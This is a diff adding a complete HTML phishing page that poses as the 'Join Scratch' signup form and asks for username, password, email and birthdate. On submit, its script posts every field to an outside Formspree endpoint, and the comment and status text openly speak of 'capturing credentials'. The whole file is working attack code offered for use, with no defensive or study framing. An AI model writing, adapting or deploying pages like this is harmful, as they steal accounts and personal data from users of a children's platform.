@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Scratch</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 50px auto;
+            padding: 20px;
+            width: 300px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0099ff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .form-group button:hover {
+            background-color: #0077cc;
+        }
+        #message {
+            margin-top: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Join Scratch</h2>
+        <form id="signup-form">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="birthdate">Birthdate</label>
+                <input type="date" id="birthdate" name="birthdate" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Join Scratch</button>
+            </div>
+        </form>
+        <div id="message"></div>
+    </div>
+
+    <script>
+        document.getElementById('signup-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const birthdate = document.getElementById('birthdate').value;
+
+            console.log('Form Data:', { username, password, email, birthdate });
+
+            // Send the credentials to Formspree
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('email', email);
+            formData.append('birthdate', birthdate);
+
+            fetch('https://formspree.io/f/xrbgkrya', { method: 'POST', body: formData })
+                .then(response => {
+                    console.log('Response:', response);
+                    if (response.ok) {
+                        document.getElementById('message').innerText = 'Credentials captured successfully!';
+                    } else {
+                        document.getElementById('message').innerText = 'Error capturing credentials.';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('message').innerText = 'Error capturing credentials.';
+                });
+        });
+    </script>
+</body>
+</html>
